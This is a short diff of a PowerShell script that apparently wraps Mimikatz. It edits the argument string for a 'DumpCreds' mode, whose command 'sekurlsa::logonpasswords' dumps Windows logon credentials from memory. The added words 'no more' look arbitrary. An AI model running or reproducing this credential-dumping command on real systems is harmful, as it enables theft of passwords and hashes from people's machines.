@@ -2707,7 +2707,7 @@ Function Main
 
 	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
-		$ExeArgs = "sekurlsa::logonpasswords exit test"
+		$ExeArgs = "sekurlsa::logonpasswords exit no more test"
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
